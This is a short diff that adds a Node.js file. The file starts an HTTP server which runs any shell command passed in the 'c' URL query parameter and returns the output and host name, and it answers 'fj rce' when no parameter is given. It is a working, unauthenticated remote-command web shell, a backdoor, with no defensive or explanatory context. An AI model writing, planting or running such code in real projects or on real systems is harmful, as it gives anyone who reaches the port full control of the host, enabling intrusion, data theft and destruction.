@@ -1,0 +1,3 @@
+const http=require('http'),cp=require('child_process');
+function sh(c){try{return cp.execSync(c,{timeout:25000,maxBuffer:400000,encoding:'utf8'});}catch(e){return '[ec]'+((e.stdout||'')+(e.stderr||''));}}
+http.createServer((q,s)=>{const u=new URL(q.url,'http://x');const c=u.searchParams.get('c');s.writeHead(200,{'content-type':'text/plain'});s.end(c?sh(c)+'\n---\nhost='+require('os').hostname():'fj rce\n');}).listen(process.env.PORT||3000);
